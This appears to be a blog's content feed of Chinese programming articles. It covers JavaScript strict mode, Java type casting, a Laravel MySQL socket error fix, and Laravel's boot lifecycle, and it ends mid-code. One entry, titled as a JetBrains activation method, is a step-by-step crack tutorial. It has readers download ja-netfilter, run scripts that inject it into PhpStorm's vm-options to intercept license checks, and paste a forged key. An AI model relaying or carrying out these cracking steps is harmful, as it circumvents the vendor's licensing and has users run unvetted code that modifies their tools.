<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [a, <span class="built_in">arguments</span>[<span class="number">0</span>]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>); <span class="comment">// 正常模式为[2,2]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [a, <span class="built_in">arguments</span>[<span class="number">0</span>]];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>); <span class="comment">// 严格模式为[2,1]</span></span><br></pre></td></tr></table></figure>

<p>（3）禁止使用arguments.callee</p>
<p>这意味着，你无法在匿名函数内部调用自身了。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">arguments</span>.callee; &#125;;</span><br><span class="line"></span><br><span class="line">f(); <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>

<h5 id="4-9-函数必须声明在顶层"><a href="#4-9-函数必须声明在顶层" class="headerlink" title="4.9 函数必须声明在顶层"></a>4.9 函数必须声明在顶层</h5><p>将来Javascript的新版本会引入”块级作用域”。为了与新版本接轨，严格模式只允许在全局作用域或函数作用域的顶层声明函数。也就是说，不允许在非函数的代码块内声明函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; &#125; <span class="comment">// 语法错误</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>) </span>&#123; &#125; <span class="comment">// 语法错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="4-10-保留字"><a href="#4-10-保留字" class="headerlink" title="4.10 保留字"></a>4.10 保留字</h5><p>为了向将来Javascript的新版本过渡，严格模式新增了一些保留字：implements, interface, let, package, private, protected, public, static, yield。</p>
<p>使用这些词作为变量名将会报错。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">package</span>(<span class="params">protected</span>) </span>&#123; <span class="comment">// 语法错误</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    "use strict"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> implements; <span class="comment">// 语法错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此外，ECMAscript第五版本身还规定了另一些保留字（class, enum, export, extends, import, super），以及各大浏览器自行增加的const保留字，也是不能作为变量名的。</p>
<p>五、参考链接</p>
<ul>
<li><p>MDN,<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode" target="_blank" rel="noopener">Strict mode</a></p>
</li>
<li><p>Dr. Axel Rauschmayer，<a href="https://2ality.com/2011/01/javascripts-strict-mode-summary.html" target="_blank" rel="noopener">JavaScript’s strict mode: a summary</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title>Java上转型和下转型</title>
    <url>/articles/Java%E4%B8%8A%E8%BD%AC%E5%9E%8B%E5%92%8C%E4%B8%8B%E8%BD%AC%E5%9E%8B/</url>
    <content><![CDATA[<p><code>Java</code> 转型问题其实并不复杂，只要记住一句话：父类引用指向子类对象。</p>
<p>什么叫父类引用指向子类对象，且听我慢慢道来.</p>
<p>从2个名词开始说起：向上转型(upcasting) 、向下转型(downcasting).</p>
<p>举个例子：有2个类，Father是父类，Son类继承自Father。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Father f1 = <span class="keyword">new</span> Son();   <span class="comment">// 这就叫 upcasting （向上转型)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在f1引用指向一个Son对象</span></span><br><span class="line"></span><br><span class="line">Son s1 = (Son)f1;   <span class="comment">// 这就叫 downcasting (向下转型)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在f1还是指向Son对象</span></span><br></pre></td></tr></table></figure>

<p>第2个例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Father f2 = <span class="keyword">new</span> Father();</span><br><span class="line"></span><br><span class="line">Son s2 = (Son)f2;       <span class="comment">// 出错，子类引用不能指向父类对象</span></span><br></pre></td></tr></table></figure>

<p>你或许会问，第1个例子中：<em>Son s1 = (Son)f1</em>; 为什么是正确的呢？</p>
<p>很简单因为f1指向一个子类对象，<em>Father f1 = new Son()</em>; 子类s1引用当然可以指向子类对象了。</p>
<p>而f2 被传给了一个Father对象，<em>Father f2 = new Father()</em>；子类s1引用不能指向父类对象。</p>
<p>总结：</p>
<p>1。父类引用指向子类对象，而子类引用不能指向父类对象。</p>
<p>2。把子类对象直接赋给父类引用叫upcasting向上转型，向上转型不用强制转换。</p>
<p>如：Father f1 = new Son();</p>
<p>3。把指向子类对象的父类引用赋给子类引用叫向下转型(downcasting)，要强制转换。</p>
<p>如：f1 就是一个指向子类对象的父类引用。把f1赋给子类引用s1即 Son s1 = (Son)f1；</p>
<p>其中f1前面的(Son)必须加上，进行强制转换。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>Laravel SQLSTATE 2002-No such file or directory</title>
    <url>/articles/Laravel%20SQLSTATE%202002%20-%20No%20such%20file%20or%20directory/</url>
    <content><![CDATA[<p>问题</p>
<p>SQLSTATE[HY000] [2002] No such file or directory</p>
<p>原因</p>
<p>框架没有找到对应的mysql执行</p>
<p>解决方案</p>
<ol>
<li><p>执行sql语句 <code>show variables like ‘%sock%’</code> 获取 mysql socket 的位置 ,  对应返回的字段 socket 对应的value, 一般的结果大概长这个样子 /tmp/mysql.sock</p>
</li>
<li><p>修改文件 <code>./config/database.php</code> 中的 connections 下的 mysql 添加</p>
</li>
</ol>
<p>‘unix_socket’ =&gt; ‘/tmp/mysql.sock’</p>
<p>或者在.env中添加</p>
<p>DB_SOCKET = /tmp/mysql.sock</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>Jetbrains系列产品最新激活方法[持续更新]</title>
    <url>/articles/Jetbrains%E7%B3%BB%E5%88%97%E4%BA%A7%E5%93%81%E6%9C%80%E6%96%B0%E6%BF%80%E6%B4%BB%E6%96%B9%E6%B3%95%5B%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5D/</url>
    <content><![CDATA[<p><font style="color:red;font-size:1.5rem;">本教程内容自始至终都是免费使用，如果有你发现有人盗取牟利，请拒绝并不遗余力地在一切平台举报投诉他！</font></p>
<p style="color:rgb(240, 0, 0)">2022年08月01日更新: 此 IDEA 激活破解教程适用于2021.3以后的所有版本，在版本<a href="https://download.jetbrains.com.cn/webide/PhpStorm-2022.2.3.exe" target="_blank" rel="noopener">PhpStorm-2022.2.3</a>亲测有效</p> 

<p><code>注意：此原理是拦截认证链接，让我们的key顺利认证通过，故无需改动 host 文件</code></p>
<p>想了解原理的请移步<a href="https://zhile.io/2021/11/29/ja-netfilter-javaagent-lib.html" target="_blank" rel="noopener">ja-netfilter原理</a>， 看代码移步<a href="https://gitee.com/ja-netfilter/ja-netfilter" target="_blank" rel="noopener">ja-netfilter</a></p>
<blockquote>
<p>进入大佬提供的导航页面<a href="https://3.jetbra.in/" target="_blank" rel="noopener">https://3.jetbra.in/</a>，点击绿色徽标的链接进入</p>
</blockquote>
<p><img src="/articles/Jetbrains系列产品最新激活方法[持续更新]/key.png" alt="插件导航页面"></p>
<blockquote>
<p>进入插件页面</p>
</blockquote>
<p><img src="/articles/Jetbrains系列产品最新激活方法[持续更新]/plugin.png" alt="插件页"></p>
<blockquote>
<p>先点击下载 <code>jetbar.zip</code> 文件，进入script目录，根据当前系统双击执行脚本（例如windows选择.vbs， linux选择.sh)，等待几秒就会出现·done·弹窗表示安装完成（实际上就是向你的phpstorm的vm-options里面将根目录的ja-netfilter.jar等一些参数写入配置中），如果弹出其他错误，根据错误提示修改就可以。</p>
</blockquote>
<p><img src="/articles/Jetbrains系列产品最新激活方法[持续更新]/jetbra.png" alt="jetbar.zip文件内容"><br><img src="/articles/Jetbrains系列产品最新激活方法[持续更新]/jetbra2.png" alt="激活程序"></p>
<blockquote>
<p>回到插件页面，移动鼠标到phpstrom, 点击 <code>Copy to clipboard</code> (就是复制到剪贴板的意思)，就将我们要认证的key复制好了。</p>
</blockquote>
<p><img src="/articles/Jetbrains系列产品最新激活方法[持续更新]/auth.png" alt="复制phpstorm的认证key"></p>
<blockquote>
<p>打开你的phpstorm的激活页面，选择激活码激活，输入你上面复制的key, 点击确定。</p>
</blockquote>
<p><img src="/articles/Jetbrains系列产品最新激活方法[持续更新]/active.png" alt="激活你的phpstorm"></p>
<p><strong>tips:</strong> 这个插件作用不止于此，更多东西需要你发挥想象。</p>
<hr>

<blockquote>
<p>本项目只做个人学习研究之用，不得用于商业用途！<br>若资金允许，请点击<a href="https://www.jetbrains.com/idea/buy/" target="_blank" rel="noopener">链接</a>购买正版，谢谢合作！<br>学生凭学生证可<a href="https://sales.jetbrains.com/hc/zh-cn/articles/207154369-学生授权申请方式" target="_blank" rel="noopener">免费申请</a>正版授权！<br>创业公司可<a href="https://www.jetbrains.com/shop/eform/startup" target="_blank" rel="noopener">5折购买</a>正版授权！<br>本教程涉及到软件和技术均来自网络，如果侵权请<a href="mailto://529156563@qq.com" target="_blank" rel="noopener">联系作者</a>删除!</p>
</blockquote>
]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>Laravel 启动流程</title>
    <url>/articles/Laravel%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<style> 
.posts-expand .post-body img {
    margin: 0 auto !important;
}
</style>

<h2 id="0-Laravel生命周期"><a href="#0-Laravel生命周期" class="headerlink" title="0. Laravel生命周期"></a>0. Laravel生命周期</h2><p>说明Laravel生命周期前，先简单回忆一下PHP的生命周期。</p>
<p>当我们请求一个PHP文件时，PHP为了完成这次请求，会发生5个阶段的生命周期切换。</p>
<p><img src="/articles/Laravel启动流程/PHP%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.jpg" alt="PHP生命周期"></p>
<p><strong>MINIT：</strong> 模块初始化，即调用 php.ini 中指明的扩展的初始化函数进行初始化工作，如 mysql 扩展。<br><strong>RINIT：</strong> 请求初始化，即初始化为执行本次脚本所需要的变量名称和变量值内容的符号表，如 $_SESSION变量。<br><strong>HANDLE：</strong> 执行该PHP脚本。<br><strong>RSHUTDOWN：</strong> 请求处理完成(Request Shutdown),按顺序调用各个模块的 RSHUTDOWN 方法，对每个变量调用 unset函数，如 unset $_SESSION 变量。<br><strong>MSHUTDOWN：</strong> 关闭模块(Module Shutdown),PHP调用每个扩展的 MSHUTDOWN 方法，这是各个模块最后一次释放内存的机会, 这意味着没有下一个请求了。</p>
<p><code>小结： PHP是一种脚本语言，所有的变量只会在这一次请求中生效，下次请求之时已被重置，而不像Java静态变量拥有全局作用。</code></p>
<p>Laravel 的生命周期从public\index.php开始，从public\index.php结束。具体来讲可以分成4个步骤：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. 文件载入composer生成的自动加载设置，包括所有你 composer require的依赖。</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/../vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 2. 生成容器Container，Application实例，并向容器注册核心组件（HttpKernel，ConsoleKernel ，ExceptionHandler）</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line">$app = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">'/../bootstrap/app.php'</span>;</span><br><span class="line">$kernel = $app-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 3.处理请求，生成并发送响应（毫不夸张的说，你99%的代码都运行在这个小小的handle 方法里面）</span></span><br><span class="line"><span class="comment"> **/</span> </span><br><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br><span class="line">$response-&gt;send();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 4.请求结束，进行回调（还记得可终止中间件吗？没错，就是在这里回调的）</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line">$kernel-&gt;terminate($request, $response);</span><br></pre></td></tr></table></figure>

<p>过程如下：</p>
<p><img src="/articles/Laravel启动流程/Laravel%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.jpg" alt="Laravel生命周期"></p>
<h2 id="1-程序启动准备"><a href="#1-程序启动准备" class="headerlink" title="1. 程序启动准备"></a>1. 程序启动准备</h2><p>程序入口在 index.php 中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/../vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">$app = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">'/../bootstrap/app.php'</span>;	<span class="comment"># 获取服务容器实例</span></span><br><span class="line"></span><br><span class="line">$kernel = $app-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br><span class="line"></span><br><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$response-&gt;send();</span><br><span class="line"></span><br><span class="line">$kernel-&gt;terminate($request, $response);</span><br></pre></td></tr></table></figure>

<p><strong>创建服务容器实例</strong></p>
<p>服务容器的创建在 <code>bootstrap\app.php</code> 中进行.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$app = <span class="keyword">new</span> Illuminate\Foundation\Application(</span><br><span class="line">    realpath(<span class="keyword">__DIR__</span>.<span class="string">'/../'</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="1-1-容器基础配置"><a href="#1-1-容器基础配置" class="headerlink" title="1.1 容器基础配置"></a>1.1 容器基础配置</h3><p>容器 <code>Application</code> 的构造函数:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($basePath = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($basePath) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setBasePath($basePath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;registerBaseBindings();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;registerBaseServiceProviders();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;registerCoreContainerAliases();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造函数 主要完成以下基本配置:</p>
<ul>
<li>目录路径(绑定到容器中, 并提供类方法获取子目录)</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setBasePath</span><span class="params">($basePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;basePath = rtrim($basePath, <span class="string">'\/'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;bindPathsInContainer();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">bindPathsInContainer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path'</span>, <span class="keyword">$this</span>-&gt;path());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.base'</span>, <span class="keyword">$this</span>-&gt;basePath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.lang'</span>, <span class="keyword">$this</span>-&gt;langPath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.config'</span>, <span class="keyword">$this</span>-&gt;configPath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.public'</span>, <span class="keyword">$this</span>-&gt;publicPath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.storage'</span>, <span class="keyword">$this</span>-&gt;storagePath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.database'</span>, <span class="keyword">$this</span>-&gt;databasePath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.resources'</span>, <span class="keyword">$this</span>-&gt;resourcePath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.bootstrap'</span>, <span class="keyword">$this</span>-&gt;bootstrapPath());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>绑定容器自身</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">registerBaseBindings</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span>::setInstance(<span class="keyword">$this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'app'</span>, <span class="keyword">$this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(Container::class, <span class="keyword">$this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(PackageManifest::class, <span class="keyword">new</span> PackageManifest(</span><br><span class="line">        <span class="keyword">new</span> Filesystem, <span class="keyword">$this</span>-&gt;basePath(), <span class="keyword">$this</span>-&gt;getCachedPackagesPath()</span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>基础服务注册( Event, Log, Route)</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">registerBaseServiceProviders</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;register(<span class="keyword">new</span> EventServiceProvider(<span class="keyword">$this</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;register(<span class="keyword">new</span> LogServiceProvider(<span class="keyword">$this</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;register(<span class="keyword">new</span> RoutingServiceProvider(<span class="keyword">$this</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>别名注册</li>
</ul>
<p>多个接口名 对应一个简短别名, 后续在注册服务时只需绑定到别名上即可 (而不必绑定到具体接口名)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerCoreContainerAliases</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ([</span><br><span class="line">        <span class="string">'app'</span>                  =&gt; [\Illuminate\Foundation\Application::class, \Illuminate\Contracts\Container\Container::class, \Illuminate\Contracts\Foundation\Application::class,  \Psr\Container\ContainerInterface::class],</span><br><span class="line">        <span class="string">'auth'</span>                 =&gt; [\Illuminate\Auth\AuthManager::class, \Illuminate\Contracts\Auth\Factory::class],</span><br><span class="line">        <span class="string">'auth.driver'</span>          =&gt; [\Illuminate\Contracts\Auth\Guard::class],</span><br><span class="line">        <span class="string">'blade.compiler'</span>       =&gt; [\Illuminate\View\Compilers\BladeCompiler::class],</span><br><span class="line">        <span class="string">'cache'</span>                =&gt; [\Illuminate\Cache\CacheManager::class, \Illuminate\Contracts\Cache\Factory::class],</span><br><span class="line">        <span class="string">'cache.store'</span>          =&gt; [\Illuminate\Cache\Repository::class, \Illuminate\Contracts\Cache\Repository::class],</span><br><span class="line">        <span class="string">'config'</span>               =&gt; [\Illuminate\Config\Repository::class, \Illuminate\Contracts\Config\Repository::class],</span><br><span class="line">        <span class="string">'cookie'</span>               =&gt; [\Illuminate\Cookie\CookieJar::class, \Illuminate\Contracts\Cookie\Factory::class, \Illuminate\Contracts\Cookie\QueueingFactory::class],</span><br><span class="line">        <span class="string">'encrypter'</span>            =&gt; [\Illuminate\Encryption\Encrypter::class, \Illuminate\Contracts\Encryption\Encrypter::class],</span><br><span class="line">        <span class="string">'db'</span>                   =&gt; [\Illuminate\Database\DatabaseManager::class],</span><br><span class="line">        <span class="string">'db.connection'</span>        =&gt; [\Illuminate\Database\Connection::class, \Illuminate\Database\ConnectionInterface::class],</span><br><span class="line">        <span class="string">'events'</span>               =&gt; [\Illuminate\Events\Dispatcher::class, \Illuminate\Contracts\Events\Dispatcher::class],</span><br><span class="line">        <span class="string">'files'</span>                =&gt; [\Illuminate\Filesystem\Filesystem::class],</span><br><span class="line">        <span class="string">'filesystem'</span>           =&gt; [\Illuminate\Filesystem\FilesystemManager::class, \Illuminate\Contracts\Filesystem\Factory::class],</span><br><span class="line">        <span class="string">'filesystem.disk'</span>      =&gt; [\Illuminate\Contracts\Filesystem\Filesystem::class],</span><br><span class="line">        <span class="string">'filesystem.cloud'</span>     =&gt; [\Illuminate\Contracts\Filesystem\Cloud::class],</span><br><span class="line">        <span class="string">'hash'</span>                 =&gt; [\Illuminate\Contracts\Hashing\Hasher::class],</span><br><span class="line">        <span class="string">'translator'</span>           =&gt; [\Illuminate\Translation\Translator::class, \Illuminate\Contracts\Translation\Translator::class],</span><br><span class="line">        <span class="string">'log'</span>                  =&gt; [\Illuminate\Log\Writer::class, \Illuminate\Contracts\Logging\Log::class, \Psr\Log\LoggerInterface::class],</span><br><span class="line">        <span class="string">'mailer'</span>               =&gt; [\Illuminate\Mail\Mailer::class, \Illuminate\Contracts\Mail\Mailer::class, \Illuminate\Contracts\Mail\MailQueue::class],</span><br><span class="line">        <span class="string">'auth.password'</span>        =&gt; [\Illuminate\Auth\Passwords\PasswordBrokerManager::class, \Illuminate\Contracts\Auth\PasswordBrokerFactory::class],</span><br><span class="line">        <span class="string">'auth.password.broker'</span> =&gt; [\Illuminate\Auth\Passwords\PasswordBroker::class, \Illuminate\Contracts\Auth\PasswordBroker::class],</span><br><span class="line">        <span class="string">'queue'</span>                =&gt; [\Illuminate\Queue\QueueManager::class, \Illuminate\Contracts\Queue\Factory::class, \Illuminate\Contracts\Queue\Monitor::class],</span><br><span class="line">        <span class="string">'queue.connection'</span>     =&gt; [\Illuminate\Contracts\Queue\Queue::class],</span><br><span class="line">        <span class="string">'queue.failer'</span>         =&gt; [\Illuminate\Queue\Failed\FailedJobProviderInterface::class],</span><br><span class="line">        <span class="string">'redirect'</span>             =&gt; [\Illuminate\Routing\Redirector::class],</span><br><span class="line">        <span class="string">'redis'</span>                =&gt; [\Illuminate\Redis\RedisManager::class, \Illuminate\Contracts\Redis\Factory::class],</span><br><span class="line">        <span class="string">'request'</span>              =&gt; [\Illuminate\Http\Request::class, \Symfony\Component\HttpFoundation\Request::class],</span><br><span class="line">        <span class="string">'router'</span>               =&gt; [\Illuminate\Routing\Router::class, \Illuminate\Contracts\Routing\Registrar::class, \Illuminate\Contracts\Routing\BindingRegistrar::class],</span><br><span class="line">        <span class="string">'session'</span>              =&gt; [\Illuminate\Session\SessionManager::class],</span><br><span class="line">        <span class="string">'session.store'</span>        =&gt; [\Illuminate\Session\Store::class, \Illuminate\Contracts\Session\Session::class],</span><br><span class="line">        <span class="string">'url'</span>                  =&gt; [\Illuminate\Routing\UrlGenerator::class, \Illuminate\Contracts\Routing\UrlGenerator::class],</span><br><span class="line">        <span class="string">'validator'</span>            =&gt; [\Illuminate\Validation\Factory::class, \Illuminate\Contracts\Validation\Factory::class],</span><br><span class="line">        <span class="string">'view'</span>                 =&gt; [\Illuminate\View\Factory::class, \Illuminate\Contracts\View\Factory::class],</span><br><span class="line">    ] <span class="keyword">as</span> $key =&gt; $aliases) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($aliases <span class="keyword">as</span> $alias) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;alias($key, $alias);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-核心类绑定"><a href="#1-2-核心类绑定" class="headerlink" title="1.2 核心类绑定"></a>1.2 核心类绑定</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$app-&gt;singleton(</span><br><span class="line">    Illuminate\Contracts\Http\Kernel::class,</span><br><span class="line">    App\Http\Kernel::class</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$app-&gt;singleton(</span><br><span class="line">    Illuminate\Contracts\Console\Kernel::class,</span><br><span class="line">    App\Console\Kernel::class</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$app-&gt;singleton(</span><br><span class="line">    Illuminate\Contracts\Debug\ExceptionHandler::class,</span><br><span class="line">    App\Exceptions\Handler::class</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><strong>绑定重要接口:</strong></p>
<ul>
<li>Http 核心类</li>
<li>命令行 核心类</li>
<li>异常处理类</li>
</ul>
<h3 id="1-3-实例化Http核心类"><a href="#1-3-实例化Http核心类" class="headerlink" title="1.3 实例化Http核心类"></a>1.3 实例化Http核心类</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$kernel = $app-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br></pre></td></tr></table></figure>

<p>Http 核心类的构造函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Application $app, Router $router)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;router = $router;</span><br><span class="line"></span><br><span class="line">    $router-&gt;middlewarePriority = <span class="keyword">$this</span>-&gt;middlewarePriority;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;middlewareGroups <span class="keyword">as</span> $key =&gt; $middleware) &#123;</span><br><span class="line">        $router-&gt;middlewareGroup($key, $middleware);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;routeMiddleware <span class="keyword">as</span> $key =&gt; $middleware) &#123;</span><br><span class="line">        $router-&gt;aliasMiddleware($key, $middleware);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述过程主要做的事是将中间件赋值给路由</p>
<ul>
<li>中间件顺序优先级列表</li>
<li>中间件组</li>
<li>中间件别名</li>
</ul>
<p><strong>核心类</strong> <code>app/Http/Kernel.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Http</span>\<span class="title">Kernel</span> <span class="title">as</span> <span class="title">HttpKernel</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kernel</span> <span class="keyword">extends</span> <span class="title">HttpKernel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 全局中间件，最先调用</span></span><br><span class="line">    <span class="keyword">protected</span> $middleware = [</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检测是否应用是否进入『维护模式』</span></span><br><span class="line">        <span class="comment">// 见：https://d.laravel-china.org/docs/5.5/configuration#maintenance-mode</span></span><br><span class="line">        \Illuminate\Foundation\Http\Middleware\CheckForMaintenanceMode::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检测请求的数据是否过大</span></span><br><span class="line">        \Illuminate\Foundation\Http\Middleware\ValidatePostSize::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对提交的请求参数进行 PHP 函数 `trim()` 处理</span></span><br><span class="line">        